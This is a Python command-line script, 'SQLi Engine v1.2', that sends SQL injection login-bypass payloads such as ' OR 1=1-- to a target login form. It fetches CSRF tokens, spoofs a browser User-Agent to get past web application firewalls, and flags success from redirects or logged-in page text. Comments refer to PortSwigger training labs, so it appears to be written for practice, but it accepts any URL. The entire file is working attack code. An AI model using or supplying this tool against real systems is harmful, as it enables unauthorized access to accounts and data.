import requests
from bs4 import BeautifulSoup
import argparse
import sys
import time

class SQLiEngine:
    def __init__(self, target_url, verify_ssl=False):
        self.target_url = target_url
        self.session = requests.Session()
        # SPOOF USER-AGENT: PortSwigger and other WAFs block default 'python-requests'
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Upgrade-Insecure-Requests': '1'
        })
        self.verify_ssl = verify_ssl
        requests.packages.urllib3.disable_warnings()

    def get_csrf_token(self, url):
        """Extracts CSRF token from a page within the current session."""
        try:
            response = self.session.get(url, verify=self.verify_ssl)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Check common CSRF field names
            for field_name in ['csrf', '_csrf', 'csrf_token', 'authenticity_token']:
                csrf_input = soup.find('input', {'name': field_name})
                if csrf_input:
                    token = csrf_input.get('value')
                    # We also need to return the field name so we know what to send
                    return field_name, token
                    
            # If we fall through here, the page didn't have a CSRF token where it was expected
            print(f"[-] WARNING: Could not find any CSRF input field on {url}")
            if "Invalid CSRF token" in response.text:
                print("[-] The server returned an 'Invalid CSRF token' error page instead of a login page.")
            return None, None
        except Exception as e:
            print(f"[-] Error extracting CSRF: {e}")
            return None, None

    def audit_sqli(self, target_endpoint, param_name, method='POST', base_value='administrator', other_data=None):
        """Performs SQLi probes using GET or POST."""
        payloads = ["'-- ", "' OR 1=1-- ", "' #", "' OR '1'='1'-- ", "\" OR 1=1-- "]
        other_data = other_data or {}
        
        print(f"[*] Starting {method} Audit on {target_endpoint}")
        
        for payload in payloads:
            csrf_name, csrf_token = self.get_csrf_token(self.target_url)
            injection_value = base_value + payload
            
            # Prepare data
            data = {param_name: injection_value}
            data.update(other_data)
            
            if csrf_name and csrf_token and csrf_name not in data:
                data[csrf_name] = csrf_token
            elif method.upper() == 'POST' and not csrf_token:
                print(f"[-] WARNING: Skipping payload '{injection_value}' because no CSRF token was found.")
                continue
            
            # PortSwigger labs often require a password field
            if 'password' not in data and param_name == 'username':
                data['password'] = 'test'
            
            try:
                # Add Referer and Origin for strict CSRF validation frameworks
                post_headers = {
                    'Referer': self.target_url,
                    'Origin': '/'.join(self.target_url.split('/')[:3]), # e.g. https://id.web-security-academy.net
                    'Content-Type': 'application/x-www-form-urlencoded'
                }

                if method.upper() == 'POST':
                    response = self.session.post(target_endpoint, data=data, headers=post_headers, verify=self.verify_ssl, allow_redirects=False)
                else:
                    response = self.session.get(target_endpoint, params=data, verify=self.verify_ssl, allow_redirects=False)
                
                print(f"[+] Payload: {injection_value} -> Status: {response.status_code}")
                
                # Success Signatures
                is_vulnerable = (
                    response.status_code in [302, 301] or 
                    any(keyword in response.text for keyword in ["Welcome", "Logout", "My Account", "Dashboard"]) or
                    any(sig in response.text.lower() for sig in ["sql syntax", "mysql_fetch", "syntax error"])
                )

                if is_vulnerable:
                    print(f"\n[!!!] VULNERABILITY CONFIRMED: {injection_value}")
                    if response.headers.get('Location'):
                        print(f"[!] Redirect Location: {response.headers.get('Location')}")
                    return True
                
                # Check if it was a 400 Bad Request which might indicate missing parameters
                if "Invalid CSRF token" in response.text or response.status_code == 400:
                    print(f"    [-] Server returned 'Invalid CSRF token' on submission.")
                
            except Exception as e:
                print(f"[-] Probe failed for {injection_value}: {e}")
            
            time.sleep(0.5)
            
        print("\n[-] Payloads exhausted. No vulnerability confirmed.")
        return False

def main():
    parser = argparse.ArgumentParser(description="Python SQLi Engine v1.2")
    parser.add_argument("--url", required=True, help="Target page URL (to fetch cookies/csrf)")
    parser.add_argument("--endpoint", help="Target endpoint for probes (defaults to --url)")
    parser.add_argument("--method", default="POST", choices=["GET", "POST"], help="HTTP Method")
    parser.add_argument("--param", default="username", help="Parameter to inject into")
    parser.add_argument("--value", default="administrator", help="Base value for the parameter")
    parser.add_argument("--data", default="", help="Additional data parameters in format key1=val1,key2=val2")
    
    args = parser.parse_args()
    endpoint = args.endpoint or args.url
    
    other_data = {}
    if args.data:
        for pair in args.data.split(','):
            if '=' in pair:
                k, v = pair.split('=', 1)
                other_data[k.strip()] = v.strip()
    
    engine = SQLiEngine(args.url)
    engine.audit_sqli(endpoint, args.param, args.method, args.value, other_data)

if __name__ == "__main__":
    main()
